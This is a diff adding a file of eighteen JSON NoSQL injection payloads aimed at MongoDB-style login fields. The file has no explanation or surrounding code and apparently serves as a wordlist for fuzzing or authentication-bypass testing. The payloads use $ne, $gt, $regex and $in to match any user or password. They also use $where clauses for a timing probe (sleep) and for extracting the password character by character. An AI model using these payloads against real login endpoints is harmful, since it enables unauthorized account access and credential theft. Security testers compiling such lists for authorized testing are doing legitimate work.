@@ -1,0 +1,18 @@
+{"username": {"$ne": null}, "password": {"$ne": null}}
+{"username": {"$gt": ""}, "password": {"$gt": ""}}
+{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
+{"username": {"$in": ["admin", "user"]}, "password": {"$ne": null}}
+{"username": {"$where": "this.password.length < 1"}}
+{"username": {"$where": "sleep(5000)"}}
+{"username": {"$regex": "^a.*"}}
+{"username": {"$ne": "admin"}, "password": {"$ne": "admin"}}
+{"username": {"$eq": "admin"}, "password": {"$ne": "wrongpass"}}
+{"username": {"$or": [{"$ne": null}, {"$gt": ""}]}, "password": {"$ne": null}}
+{"username": {"$where": "this.password.match(/.*/)"}, "password": {"$ne": null}}
+{"username": {"$where": "this.password.match(/^a/)"}, "password": {"$ne": null}}
+{"username": {"$where": "this.password.match(/^b/)"}, "password": {"$ne": null}}
+{"username": {"$where": "this.password.match(/^c/)"}, "password": {"$ne": null}}
+{"username": {"$where": "this.password.match(/^d/)"}, "password": {"$ne": null}}
+{"username": {"$in": []}}
+{"username": {"$regex": "^admin.*"}, "password": {"$regex": "^[a-z].*"}}
+{"$or": [{"username": "admin"}, {"username": {"$ne": ""}}]}
